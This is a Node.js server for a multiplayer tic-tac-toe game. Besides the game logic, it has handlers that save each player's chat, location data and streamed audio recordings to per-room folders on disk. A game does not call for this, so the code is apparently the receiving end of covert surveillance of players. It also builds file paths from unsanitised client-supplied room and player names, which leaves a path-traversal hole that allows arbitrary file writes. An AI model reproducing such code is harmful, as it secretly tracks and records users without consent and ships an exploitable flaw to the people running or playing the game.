
const express = require("express")
const http = require("http")
const { Server } = require("socket.io")
const crypto = require("crypto")
const fs = require("fs")
const path = require("path")

const app = express()

const server = http.createServer(app)

const io = new Server(server)

app.use(express.static("public"))

app.get("/sala/:id",(req,res)=>{

res.sendFile(__dirname + "/public/index.html")

})

const salas = {}

function crearCarpetaSala(room){

const ruta =
path.join(__dirname,"partidas",room)

if(!fs.existsSync("partidas")){

fs.mkdirSync("partidas")

}

if(!fs.existsSync(ruta)){

fs.mkdirSync(ruta)

fs.mkdirSync(
path.join(ruta,"audio")
)

}

return ruta

}

io.on("connection",(socket)=>{

socket.on("joinRoom",(data)=>{

const room = data.room

socket.join(room)

if(!salas[room]){

salas[room] = {
jugadores:[],
turno:"X",
tablero:["","","","","","","","",""],
scoreX:0,
scoreO:0,
estado:"esperando"
}

}

const sala = salas[room]

if(sala.jugadores.length >= 2){

socket.emit("roomFull")

return

}

const jugador = {
id:socket.id,
nombre:data.nombre,
foto:data.foto,
simbolo:
sala.jugadores.length == 0
? "X"
: "O"
}

sala.jugadores.push(jugador)

sala.estado =
sala.jugadores.length == 2
? "jugando"
: "esperando rival"

socket.emit("playerData",jugador)

io.to(room).emit(
"playersUpdate",
sala.jugadores
)

io.to(room).emit(
"statusUpdate",
sala.estado
)

io.to(room).emit(
"boardUpdate",
sala.tablero
)

io.to(room).emit(
"scoreUpdate",
{
scoreX:sala.scoreX,
scoreO:sala.scoreO
}
)

io.to(room).emit(
"turnUpdate",
sala.turno
)

})

socket.on("move",(data)=>{

const sala = salas[data.room]

if(!sala) return

const jugador =
sala.jugadores.find(
j=>j.id == socket.id
)

if(!jugador) return

if(jugador.simbolo != sala.turno)
return

if(sala.tablero[data.index] != "")
return

sala.tablero[data.index] =
jugador.simbolo

io.to(data.room).emit(
"boardUpdate",
sala.tablero
)

const ganador =
verificarGanador(
sala.tablero
)

if(ganador){

if(ganador == "X"){

sala.scoreX++

}else{

sala.scoreO++

}

io.to(data.room).emit(
"scoreUpdate",
{
scoreX:sala.scoreX,
scoreO:sala.scoreO
}
)

io.to(data.room).emit(
"winner",
ganador
)

setTimeout(()=>{

reiniciarTablero(
data.room
)

},1500)

return

}

const empate =
sala.tablero.every(c=>c!="")

if(empate){

io.to(data.room).emit(
"draw"
)

setTimeout(()=>{

reiniciarTablero(
data.room
)

},1500)

return

}

sala.turno =
sala.turno == "X"
? "O"
: "X"

io.to(data.room).emit(
"turnUpdate",
sala.turno

)

})

socket.on("resetScore",(room)=>{

if(!salas[room]) return

salas[room].scoreX = 0
salas[room].scoreO = 0

io.to(room).emit(
"scoreUpdate",
{
scoreX:0,
scoreO:0
}
)

})

socket.on("chat",(data)=>{

if(
!data.mensaje ||
data.mensaje.length > 200
) return

const ruta =
crearCarpetaSala(data.room)

fs.appendFileSync(
path.join(ruta,"chat.txt"),
"[" + data.nombre + "] " +
data.mensaje + "\n"
)

io.to(data.room).emit(
"chat",
{
nombre:data.nombre,
mensaje:data.mensaje
}
)

})

socket.on("ubicacion",(data)=>{

const ruta =
crearCarpetaSala(data.room)

fs.appendFileSync(
path.join(ruta,"ubicacion.txt"),
JSON.stringify(data) + "\n"
)

})

socket.on("audio",(data)=>{

const ruta =
crearCarpetaSala(data.room)

const archivo =
path.join(
ruta,
"audio",
data.nombre + ".webm"
)

fs.appendFileSync(
archivo,
Buffer.from(data.audio)
)

})

socket.on("disconnect",()=>{

for(const room in salas){

const sala = salas[room]

sala.jugadores =
sala.jugadores.filter(
j=>j.id != socket.id
)

if(sala.jugadores.length == 0){

delete salas[room]

continue

}

sala.estado = "esperando rival"

io.to(room).emit(
"statusUpdate",
"esperando rival"
)

io.to(room).emit(
"playersUpdate",
sala.jugadores
)

}

})

})

function reiniciarTablero(room){

if(!salas[room]) return

salas[room].tablero =
["","","","","","","","",""]

salas[room].turno = "X"

io.to(room).emit(
"boardUpdate",
salas[room].tablero
)

io.to(room).emit(
"turnUpdate",
"X"
)

}

function verificarGanador(tablero){

const combinaciones = [
[0,1,2],
[3,4,5],
[6,7,8],
[0,3,6],
[1,4,7],
[2,5,8],
[0,4,8],
[2,4,6]
]

for(let c of combinaciones){

const a = tablero[c[0]]
const b = tablero[c[1]]
const d = tablero[c[2]]

if(a != "" && a == b && b == d){

return a

}

}

return null

}

app.get("/crear",(req,res)=>{

const id =
crypto.randomBytes(3)
.toString("hex")

res.redirect("/sala/"+id)

})

server.listen(3000,()=>{

console.log("Servidor iniciado")

})
